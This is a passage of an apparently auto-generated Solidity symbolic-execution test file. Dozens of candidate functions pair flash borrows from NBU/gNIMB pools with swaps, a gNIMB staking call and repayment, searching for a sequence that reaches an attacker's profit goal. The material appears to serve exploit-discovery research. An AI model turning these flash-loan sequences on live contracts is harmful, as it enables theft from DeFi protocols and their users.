        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4745(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4746(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4747(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4748(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4749(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4750(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4751(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4752(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4753(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4754(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4755(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4756(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4757(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4758(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4759(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4760(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4761(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4762(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4763(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4764(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4765(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4766(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4767(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4768(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4769(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4770(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4771(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4772(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4773(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4774(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4775(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4776(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4777(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4778(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4779(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4780(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4781(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4782(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4783(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4784(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4785(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4786(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4787(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4788(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4789(
        uint256 amt0,
